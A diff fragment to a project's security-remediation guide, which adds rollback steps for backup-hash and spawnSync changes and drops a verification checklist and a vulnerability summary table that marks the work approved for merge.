+   ```bash
+   # Ensure backup integrity is verified
+   npm test -- --grep "backup.*integrity"
+   # If failures, restore previous hash algorithm
+   ```
 
-### For Environment Validation
-```bash
-# If validation is too strict:
-# 1. Temporarily disable validation for debugging
-# if [[ ! "$REDIS_SERVICE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
-#     log_warn "Validation disabled for debugging"
-# fi
-```
-
----
-
-## Verification Checklist
-
-After implementing fixes:
-
-- [ ] All 5 test scripts run successfully
-- [ ] No resource limit violations in CI/CD logs
-- [ ] Docker containers are properly cleaned up
-- [ ] Temp directories have unique names
-- [ ] PROJECT_ROOT validation passes
-- [ ] Environment validation catches invalid configs
-- [ ] Security audit confidence remains >= 0.90
-- [ ] Tests execute in < 5 minutes
-- [ ] No new warnings in Docker logs
+3. **Script Execution Issues:**
+   ```bash
+   # Revert to execAsync if spawnSync causes issues
+   # But only temporarily - spawnSync is more secure
+   git revert <commit-hash>
+   # Then fix spawnSync implementation
+   ```
 
 ---
 
-## Summary
-
-| Item | Current Status | Recommended Action | Timeline |
-|------|---|---|---|
-| Critical vulnerabilities | 0 | None | - |
-| High-risk vulnerabilities | 0 | None | - |
-| Medium-risk vulnerabilities | 2 | Optional fixes | Pre-production |
-| Low-risk issues | 4 | Best-practice improvements | Optional |
-| **Approval Status** | **APPROVED** | **Merge now** | **Immediate** |
-| **Security Confidence** | **0.92 (92%)** | **Maintain/Improve** | **Ongoing** |
-
----
-
-## Document Version History
-
-| Version | Date | Changes |
-|---------|------|---------|
-| 1.0 | 2025-11-13 | Initial security remediation guide |
-| - | - | - |
+**Review Date:** December 1, 2025
+**Status:** Ready for Implementation
+**Estimated Time:** 3-5 days of focused development
